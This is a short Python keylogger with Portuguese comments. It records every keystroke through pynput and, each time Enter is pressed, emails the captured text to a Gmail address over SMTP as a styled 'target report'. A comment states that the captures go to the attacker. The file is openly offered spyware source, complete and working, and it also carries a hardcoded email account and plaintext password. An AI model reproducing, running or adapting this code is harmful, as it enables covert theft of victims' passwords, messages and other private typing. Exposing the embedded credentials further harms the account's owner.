from threading import Timer
from pynput.keyboard import Listener
import smtplib
import email.message


# Formata e organiza tudo o que é digitado
frases = []
digit = ''

def monitor(tecla):
    global digit
    entrada = str(tecla)
    
    # Tratamento de entrada
    if "'" in entrada:
        entrada = entrada.replace("'", "")
        digit += entrada
    else:
        if entrada[3] == '.':
            entrada = entrada[4:]
            if entrada == 'space':
                entrada = ' '
                digit += entrada

            elif entrada == 'backspace':
                digit = digit.replace(digit[len(digit)-1], '')

            elif entrada == 'enter':
                frases.append(digit)
                global resultado
                resultado = ' || '.join(frases)
                resultado = resultado.replace('enter', ' [enter] ')
                enviar_captura(resultado)
                digit = ''
                print(frases)

            else:
                entrada = f' [{entrada}] '
                digit += entrada

# Envia as informações capturadas para o atacante

def  enviar_captura(captura):
    corpo = f'''
    <h1 style="font-family:cursive;">Relatório do <strong style="color: #ff2400;">Alvo</strong></h1><br>
    <p style="color: rgb(20, 148, 20);">     Nos últimos 5 minutos o <strong style="color: #ff2400;">alvo</strong> digitou:</p><br>
            <strong>{resultado}</strong>'''
    msg = email.message.Message()
    msg['Subject'] = 'ⓇⒺⓁⒶⓉⓄⓇⒾⓄ ⒹⒺ ⓀⒺⓎⓁⓁⓄⒼⒼⒺⓇ'
    msg['From'] = 'rodbr75@gmail.com'
    msg['To'] = 'rodbr75@gmail.com'
    password = 'filho2017'
    msg.add_header('Content-Type', 'text/html')
    msg.set_payload(corpo)

    s = smtplib.SMTP('smtp.gmail.com: 587')
    s.starttls()
    # Login Credentials for sending the mail
    s.login(msg['From'], password)
    s.sendmail(msg['From'], [msg['To']], msg.as_string().encode('utf-8'))
    print('Email enviado')


with Listener(on_press=monitor) as listener:
    listener.join()